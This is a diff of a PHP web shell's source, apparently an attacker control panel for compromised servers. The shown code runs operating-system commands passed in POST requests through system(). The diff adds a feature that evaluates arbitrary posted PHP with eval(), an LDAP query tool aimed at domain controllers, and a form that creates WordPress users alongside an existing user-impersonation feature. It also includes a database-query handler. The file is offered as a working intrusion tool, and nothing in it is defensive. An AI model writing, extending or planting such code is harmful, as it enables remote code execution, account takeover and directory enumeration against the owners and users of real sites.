+                                      $FILE_EXTRACTION_PREVIEW .
+                                      "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                             ),
                             makeCheckbox(
                                 "__PARAM_3__",
@@ -2264,7 +2541,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             ob_start();
             phpinfo();
             $php_info = ob_get_clean();
-            $content = makePage(
+            $content  = makePage(
                 array(
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
@@ -2303,73 +2580,73 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_1__",
                                 array(
                                     [
-                                        "value" => "mysql",
-                                        "label" => "MySQL",
+                                        "value"    => "mysql",
+                                        "label"    => "MySQL",
                                         "disabled" => !extension_loaded("mysql") &&
-                                            !extension_loaded("mysqli") &&
-                                            !extension_loaded("pdo_mysql"),
+                                                      !extension_loaded("mysqli") &&
+                                                      !extension_loaded("pdo_mysql"),
                                     ],
                                     [
-                                        "value" => "cubrid",
-                                        "label" => "CUBRID",
+                                        "value"    => "cubrid",
+                                        "label"    => "CUBRID",
                                         "disabled" => !extension_loaded("cubrid") && !extension_loaded("pdo_cubrid"),
                                     ],
                                     [
-                                        "value" => "pgsql",
-                                        "label" => "PostgreSQL",
+                                        "value"    => "pgsql",
+                                        "label"    => "PostgreSQL",
                                         "disabled" => !extension_loaded("pgsql") && !extension_loaded("pdo_pgsql"),
                                     ],
                                     [
-                                        "value" => "sqlite",
-                                        "label" => "SQLite",
+                                        "value"    => "sqlite",
+                                        "label"    => "SQLite",
                                         "disabled" => !extension_loaded("sqlite3") && !extension_loaded("pdo_sqlite"),
                                     ],
                                     [
-                                        "value" => "sqlsrv",
-                                        "label" => "SQL Server",
+                                        "value"    => "sqlsrv",
+                                        "label"    => "SQL Server",
                                         "disabled" => !extension_loaded("sqlsrv") && !extension_loaded("pdo_sqlsrv"),
                                     ],
                                     [
-                                        "value" => "oci",
-                                        "label" => "Oracle",
+                                        "value"    => "oci",
+                                        "label"    => "Oracle",
                                         "disabled" => !extension_loaded("oci8") && !extension_loaded("pdo_oci"),
                                     ],
                                     [
-                                        "value" => "mongodb",
-                                        "label" => "MongoDB",
+                                        "value"    => "mongodb",
+                                        "label"    => "MongoDB",
                                         "disabled" => !extension_loaded("mongo") && !extension_loaded("mongodb"),
                                     ],
                                     [
-                                        "value" => "ibm",
-                                        "label" => "IBM DB2",
+                                        "value"    => "ibm",
+                                        "label"    => "IBM DB2",
                                         "disabled" => !extension_loaded("ibm_db2") && !extension_loaded("pdo_ibm"),
                                     ],
                                     [
-                                        "value" => "firebird",
-                                        "label" => "Firebird/Interbase",
+                                        "value"    => "firebird",
+                                        "label"    => "Firebird/Interbase",
                                         "disabled" => !extension_loaded("interbase") &&
-                                            !extension_loaded("pdo_firebird"),
+                                                      !extension_loaded("pdo_firebird"),
                                     ],
                                     [
-                                        "value" => "odbc",
-                                        "label" => "ODBC",
+                                        "value"    => "odbc",
+                                        "label"    => "ODBC",
                                         "disabled" => !extension_loaded("odbc") && !extension_loaded("pdo_odbc"),
                                     ],
                                     [
-                                        "value" => "informix",
-                                        "label" => "Informix",
+                                        "value"    => "informix",
+                                        "label"    => "Informix",
                                         "disabled" => !extension_loaded("pdo_informix"),
                                     ],
                                     [
-                                        "value" => "sybase",
-                                        "label" => "Sybase",
+                                        "value"    => "sybase",
+                                        "label"    => "Sybase",
                                         "disabled" => !extension_loaded("sybase") &&
-                                            !extension_loaded("mssql") &&
-                                            !extension_loaded("pdo_dblib"),
+                                                      !extension_loaded("mssql") &&
+                                                      !extension_loaded("pdo_dblib"),
                                     ],
                                     [
-                                        "value" => "raw",
-                                        "label" => "Raw PDO connection string",
+                                        "value"    => "raw",
+                                        "label"    => "Raw PDO connection string",
                                         "disabled" => !extension_loaded("pdo"),
                                         "selected" => true,
                                     ],
@@ -2591,38 +2868,95 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page
             );
             break;
-        case $IMPERSONATE_WP_USER:
-            $users = array_map(
-                function ($data) {
-                    global $IMPERSONATE_WP_USER;
-                    return array_merge(
-                        (array)$data->data,
+        case $QUERY_LDAP:
+            $content = makePage(
+                array(
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"]
+                    ),
+                    makeForm(
+                        $page,
+                        $_SERVER["REQUEST_URI"],
                         array(
-                            "roles" => $data->roles,
-                            "actions" => makeForm(
-                                $IMPERSONATE_WP_USER,
-                                $_SERVER["REQUEST_URI"],
-                                array(
-                                    makeInput(
-                                        "hidden",
-                                        "__PARAM_1__",
-                                        "username",
-                                        "",
-                                        "Username of the user to impersonate.",
-                                        true,
-                                        null,
-                                        $data->data->user_login
-                                    )
-                                ),
-                                "post",
-                                "Impersonate",
-                                "flex flex-col max-w-xl mb-0"
-                            )
+                            makeInput(
+                                "text",
+                                "Domain controller",
+                                "__PARAM_1__",
+                                "hostname or IP address",
+                                "The domain controller to connect to.",
+                                true
+                            ),
+                            makeInput(
+                                "text",
+                                "LDAP port",
+                                "__PARAM_2__",
+                                "389",
+                                "The port to connect to."
+                            ),
+                            makeInput(
+                                "text",
+                                "Domain",
+                                "__PARAM_3__",
+                                "example.com",
+                                "The domain to connect to.",
+                                true
+                            ),
+                            makeInput(
+                                "text",
+                                "Username",
+                                "__PARAM_4__",
+                                "admin",
+                                "The username to connect with."
+                            ),
+                            makeInput(
+                                "password",
+                                "Password",
+                                "__PARAM_5__",
+                                "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                                "The password to connect with."
+                            ),
+                            makeInput(
+                                "textarea",
+                                "Query",
+                                "__PARAM_6__",
+                                "(&(objectClass=user)(sAMAccountName=*))",
+                                "The LDAP query to run against the domain controller.",
+                                true
+                            ),
                         )
-                    );
-                },
-                get_users()
+                    ),
+                ),
+                $page
             );
+            break;
+        case $EVAL:
+            $content = makePage(
+                array(
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"]
+                    ),
+                    makeForm(
+                        $page,
+                        $_SERVER["REQUEST_URI"],
+                        array(
+                            makeInput(
+                                "textarea",
+                                "PHP code",
+                                "__PARAM_1__",
+                                "echo 'Hello, world!';",
+                                "The PHP code to evaluate.",
+                                true
+                            ),
+                        )
+                    ),
+                ),
+                $page
+            );
+            break;
+        case $IMPERSONATE_WP_USER:
+            $users   = getWPUsers();
             $content = makePage(
                 array(
                     makePageHeader(
@@ -2636,10 +2970,51 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                         array(
                             "user_login" => "Username",
                             "user_email" => "Email",
-                            "roles" => "Roles",
-                            "user_url" => "URL",
-                            "actions" => "Actions"
+                            "roles"      => "Roles",
+                            "user_url"   => "URL",
+                            "actions"    => "Actions",
+                        ),
+                        "
+                        <dialog id='create-wp-user' class='p-4 rounded w-1/3'>" .
+                        makeForm(
+                            $page,
+                            $_SERVER["REQUEST_URI"],
+                            array(
+                                "<div class='flex items-center justify-between'>
+                                        <h3 class='text-lg font-semibold text-zinc-800'>Create WordPress user</h3>
+                                        <button onclick='document.getElementById(\"create-wp-user\").close(); document.getElementById(\"create-wp-user\").classList.remove(\"flex\")' 
+                                            class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
+                                            &times;
+                                        </button>
+                                    </div>",
+                                makeInput(
+                                    "text",
+                                    "Username",
+                                    "__PARAM_2__",
+                                    "admin",
+                                    "Username of the user to create.",
+                                    true
+                                ),
+                                makeInput(
+                                    "password",
+                                    "Password",
+                                    "__PARAM_3__",
+                                    "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                                    "Password of the user to create.",
+                                    true
+                                ),
+                            ),
+                            "post",
+                            "Create user",
+                            "flex flex-col gap-y-6 mx-auto w-full"
                         )
+                        . "
+                        </dialog>
+                        <button onclick='document.getElementById(\"create-wp-user\").showModal()' 
+                            class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
+                                hover:bg-zinc-700 transition-all duration-300'>
+                            Create user
+                        </button>"
                     ),
                 ),
                 $page
@@ -2681,36 +3056,23 @@ if (isPost()) {
             system($_POST["__PARAM_1__"]);
             break;
         case $QUERY_DATABASES:
-            $connection = connectAndQueryDatabase(
+            handleQueryDatabase();
+            break;
+        case $QUERY_LDAP:
+            runLDAPQuery(
                 $_POST["__PARAM_1__"],
-                $_POST["__PARAM_4__"],
-                $_POST["__PARAM_5__"],
-                $_POST["__PARAM_2__"],
+                !empty($_POST["__PARAM_2__"]) ? intval($_POST["__PARAM_2__"]) : null,
+                !empty($_POST["__PARAM_4__"]) ? $_POST["__PARAM_4__"] : null,
+                !empty($_POST["__PARAM_5__"]) ? $_POST["__PARAM_5__"] : null,
                 $_POST["__PARAM_3__"],
-                $_POST["__PARAM_8__"],
-                $_POST["__PARAM_9__"],
-                $_POST["__PARAM_6__"],
-                $_POST["__PARAM_7__"],
-                $_POST["__PARAM_10__"],
-                $_POST["__PARAM_11__"],
-                $_POST["__PARAM_12__"],
-                $_POST["__PARAM_15__"],
-                $_POST["__PARAM_17__"],
-                $_POST["__PARAM_13__"],
-                $_POST["__PARAM_14__"],
-                $_POST["__PARAM_16__"],
-                $_POST["__PARAM_18__"],
-                $_POST["__PARAM_19__"]
+                $_POST["__PARAM_6__"]
             );
-
-            /*if ($pdo) {
-                $stmt      = $pdo->query("SHOW DATABASES");
-                $databases = $stmt->fetchAll(PDO::FETCH_COLUMN);
-                echo "Databases:\n";
-                foreach ($databases as $database) {
-                    echo "- $database\n";
-                }
-            }*/
+            break;
+        case $EVAL:
+            eval($_POST["__PARAM_1__"]);
+            break;
+        case $IMPERSONATE_WP_USER:
+            handleImpersonateWPUser();
             break;
         default:
             echo "Unrecognized operation '$operation'";
